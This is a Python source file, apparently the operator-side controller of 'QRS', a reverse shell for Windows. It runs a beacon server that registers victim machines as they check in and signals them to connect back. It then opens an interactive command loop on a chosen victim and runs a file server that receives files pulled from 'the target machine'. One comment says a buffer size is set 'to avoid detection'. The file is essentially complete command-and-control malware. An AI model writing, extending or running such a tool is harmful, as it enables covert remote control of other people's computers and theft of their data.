import socket
import time
import tqdm
import os
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess

SEPARATOR = "<sep>"  # For separating filename and filesize
HelpList = ["This is a List of all available commands", "===================Description====================\n",
            "QRS a fully interactive Reverse Shell for Windows CMD so you can use any CMD commands",
            "=====================Commands=====================\n",
            "Start file server - Starts a file server to receive files from the target machine",
            "Download <filename> - Downloads a file from the target machine to the local machine into /received_files",
            "Connections - Shows all active connections and their status",
            "Connect <client_id> - Connects to a specific client using its ID", 
            "Clear - Clears the screen",
            "Clear connections - Clears all connections from the list",
            "Clear inactive - Clears all inactive connections from the list",
            "Update - Updates QRS to the latest version from the repository",
            "Exit - Exits the reverse shell",
            "Quit - Quits QRS",
            "Help - Shows this message \n",
            ]

client_id = 0
clients = []
connect = False
cwd = ""

# HTTP Server for Ping
class SimpleHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Override log_message to suppress default logging
        return  # Do nothing or implement custom logging if needed
    log_message(None, None, None)
    def do_GET(self):
        global clients, client_id, connect
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        client_address = self.client_address

        found = False
        for client in clients:
            if client.client_address[0] == client_address[0]:
                client.last_active_time = time.time()
                client.status = "ACTIVE"
                found = True
                if connect:
                    response = "connect"
                    connect = False
                else:
                    response = "notted"
                break
        if not found:
            clients.append(Client(None, client_address, client_id))
            client_id += 1
            print(f"\n{client_address[0]}:{client_address[1]} Connected!")

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        try:
            
            self.wfile.write(response.encode())
        except Exception as e:
            self.wfile.write("notted".encode())


# Start HTTP Server in Background
def start_http_server():
    httpd = HTTPServer(('0.0.0.0', 5000), SimpleHandler)
    print(f"\nPing server started on 0.0.0.0:5000\n")
    httpd.serve_forever()


# Client Class
class Client:
    def __init__(self, client_socket, client_address, client_id=0):
        self.client_socket = client_socket
        self.client_address = client_address
        self.client_id = client_id
        self.connection_time = time.time()
        self.last_active_time = self.connection_time
        self.status = "ACTIVE"

    def get_connection_duration(self):
        return time.time() - self.connection_time

    def get_last_connection_duration(self):
        return time.time() - self.last_active_time

    def GetStatus(self):
        if self.get_last_connection_duration() < 6:
            return "ACTIVE"
        else:
            return "INACTIVE"

    def __str__(self):
        Active = self.GetStatus()
        self.status = Active
        connection_duration = self.get_connection_duration()
        last_connection_duration = self.get_last_connection_duration()
        connection_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.connection_time))
        if Active != "INACTIVE":
            return f"Client ID : {self.client_id} : ACTIVE for {connection_duration:.2f} sec [Address: {self.client_address}, Connected at: {connection_time_str} ({FormatTime(connection_duration)} ago)]"
        else:
            return f"Client ID : {self.client_id} : INACTIVE for {last_connection_duration:.2f} sec [Address: {self.client_address}, Connected at: {connection_time_str} ({FormatTime(last_connection_duration)} ago), last active at: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.last_active_time))} ({FormatTime(connection_duration - last_connection_duration)} ago)]"

# Formating
def TimeStamp():
    return f"[{time.strftime('%H:%M:%S', time.localtime())}]"
def FormatTime(seconds):
    if seconds/60 > 1:
        return time.strftime('%Mm, %Ss', time.gmtime(seconds))
    elif seconds/3600 > 1:
        return time.strftime('%Hh, %Mm, %Ss', time.gmtime(seconds))
    elif seconds/86400 > 1:
        return time.strftime('%Dd, %Hh, %Mm, %Ss', time.gmtime(seconds))
    else:
        return time.strftime('%Ss', time.gmtime(seconds))

# Server for File Download
def StartServer(host='127.0.0.1', port=5005, output_folder='received_files'):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Listening on {host}:{port}...")

    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection from {client_address} has been established.")

        try:
            buffer = ""
            while SEPARATOR not in buffer:
                buffer += client_socket.recv(1024).decode('utf-8')

            filename, filesize_data = buffer.split(SEPARATOR, 1)
            if not filename or not filesize_data.isdigit():
                raise ValueError(f"Invalid filename or filesize received: '{buffer}'")
            print(f"[+] File server caught {filename}, size: {filesize_data} bytes")
            filesize = int(filesize_data)
            output_path = os.path.join(output_folder, filename)

            client_socket.send("READY".encode('utf-8'))

            with open(output_path, 'wb') as f:
                bytes_received = 0
                progress = tqdm.tqdm(total=filesize, desc=f"Downloading {filename}", unit="B", unit_scale=True,
                                     unit_divisor=1024)
                while bytes_received < filesize:
                    data = client_socket.recv(min(filesize - bytes_received, 1024))
                    if not data:
                        break
                    f.write(data)
                    bytes_received += len(data)
                    progress.update(len(data))
                progress.close()

            print(f"[+] Downloaded {filename} to {output_path}")

        except ValueError as e:
            print(f"[!] Error: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
        finally:
            client_socket.close()


# Support
def start_file_server_in_thread():
    server_thread = threading.Thread(target=StartServer, args=(SERVER_HOST, 5005), daemon=True)
    server_thread.start()
    print(f"{TimeStamp()} File Server is active on {SERVER_HOST}:5005")

def RemoveInactiveClients():
    global clients
    s = 0
    for client in clients:
        if client.GetStatus() == "INACTIVE":
            print(f"[*] Removing inactive client {client.client_id} from the list.")
            clients.remove(client)
            s += 1
    print(f"\n{TimeStamp()} Removed {s} inactive client(s) from the list.")

def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
    original_cwd = os.getcwd()
    os.chdir(repo_path)

    try:
        # Fetch remote without printing anything
        subprocess.run(['git', 'fetch'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

        # Get local and remote commit hashes
        local_commit = subprocess.check_output(
            ['git', 'rev-parse', branch],
            stderr=subprocess.DEVNULL
        ).strip()
        remote_commit = subprocess.check_output(
            ['git', 'rev-parse', f'origin/{branch}'],
            stderr=subprocess.DEVNULL
        ).strip()

        # Get local version
        local_version = "unknown"
        if os.path.exists(version_file):
            with open(version_file) as f:
                local_version = f.read().strip()

        # Get remote version
        try:
            remote_version = subprocess.check_output(
                ['git', 'show', f'origin/{branch}:{version_file}'],
                stderr=subprocess.DEVNULL
            ).decode().strip()
        except subprocess.CalledProcessError:
            remote_version = "unknown"

        # Show status
        if local_commit != remote_commit:
            print(f"[!] Update available. {local_version} > {remote_version}")
        else:
            print(f"[✓] You're up to date. Version: {local_version}")

    except subprocess.CalledProcessError as e:
        print(f"[X] Git error: {e}")
    finally:
        os.chdir(original_cwd)



SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 1024  # 128KB

# Start HTTP Server in the Background
http_server_thread = threading.Thread(target=start_http_server, daemon=True)
http_server_thread.start()

# Welcome Message
print(f"QRS Started on {SERVER_HOST}:{SERVER_PORT} at {TimeStamp()}")
print(f"Welcome to QRS a Python-based reverse shell!")
print("Type 'help' to see the available commands.")
print("--------------------------------------------------")
CheckForUpdates()
while True:
    cmd = input(f"{TimeStamp()} $> ")
    if not cmd.strip():
        continue
    if cmd.lower() == "exit":
        break
    if cmd.lower() == "help":
        for i in HelpList:
            print(i + "\n")
        continue
    if cmd.lower() == "connections":
        if len(clients) == 0:
            print(f"{TimeStamp()} No connections found.")
        else:
            print(f"{TimeStamp()} Found {len(clients)} connection(s):")
            for client in clients:
                print(f"[+] {client.__str__()}")
    if cmd.lower() == "update":
        print(f"{TimeStamp()} Updating QRS...")
        try:
            subprocess.run("git pull https://github.com/the-real-N0NAME/QRS.git", shell=True, check=True)
            print(f"{TimeStamp()} QRS updated successfully.")
            exit(0)
        except subprocess.CalledProcessError as e:
            print(f"[!] Error occurred while updating QRS: {e.stderr}")

    SplitedCMD = cmd.split()
    if SplitedCMD[0].lower() == "clear":
        if len(SplitedCMD) < 2:
            os.system("cls" if os.name == "nt" else "clear")
        elif SplitedCMD[1].lower() == "connections":
            print(f"{TimeStamp()} Clearing connection(s)...")
            clearedConnections = len(clients)
            clients.clear()
            print(f"{TimeStamp()} {clearedConnections} Connection(s) cleared.")
        elif SplitedCMD[1].lower() == "inactive":
            print(f"{TimeStamp()} Clearing inactive connections...")
            RemoveInactiveClients()
    if SplitedCMD[0].lower() == "connect":
        local_client_ID = int(SplitedCMD[1])
        if local_client_ID >= len(clients) or local_client_ID < 0:
            print("Invalid client ID.")
            continue

        client = clients[local_client_ID]
        if client.GetStatus() == "INACTIVE":
            print(f"Client {local_client_ID} is inactive. Removing from the list.")
            clients.pop(local_client_ID)
            continue

        print(f"{TimeStamp()} Connecting to {client.client_address[0]}:{client.client_address[1]}...")
        connect = True

        s = socket.socket()
        s.bind((SERVER_HOST, SERVER_PORT))
        print(f"{TimeStamp()} Waiting for client({client.client_address[0]}) connection on {SERVER_HOST}:{SERVER_PORT} ...")
        s.listen(5)
        s.settimeout(5)
        while True:
            try:
                client_socket, client_address = s.accept()
                print(f"{TimeStamp()} {client_address[0]}:{client_address[1]} Connection established!")
                # Connection Command Loop

                cwd = client_socket.recv(BUFFER_SIZE).decode()
                while True:
                    cmd = input(f"{cwd} $> ")
                    if not cmd.strip():
                        continue
                    SplitedCMD = cmd.split()
                    if SplitedCMD[0].lower() == "type":
                        print("[*] The Buffer size is Set to 1 MB to avoid detection. If you want to see larger files use the 'download' command.")
                    if cmd.lower() == "help":
                        for i in HelpList:
                            print(i)
                            print("\n")
                        continue     
                    if cmd.lower() == "start file server":
                        print(f"{TimeStamp()} Starting File Server ...")
                        start_file_server_in_thread()
                        continue
                    client_socket.send(cmd.encode())
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    
                    # Send exit before exiting to ensure the client is also closed
                    if cmd.lower() == "exit":
                        break
                    results, cwd = output.split(SEPARATOR)
                    print(results)
                break
            except socket.timeout:
                print(f"[!] Connection timed out. There was en error on the client side.")
                break
            except Exception as e:
                print(f"[!] Server side Error occurred: {e}")
                break
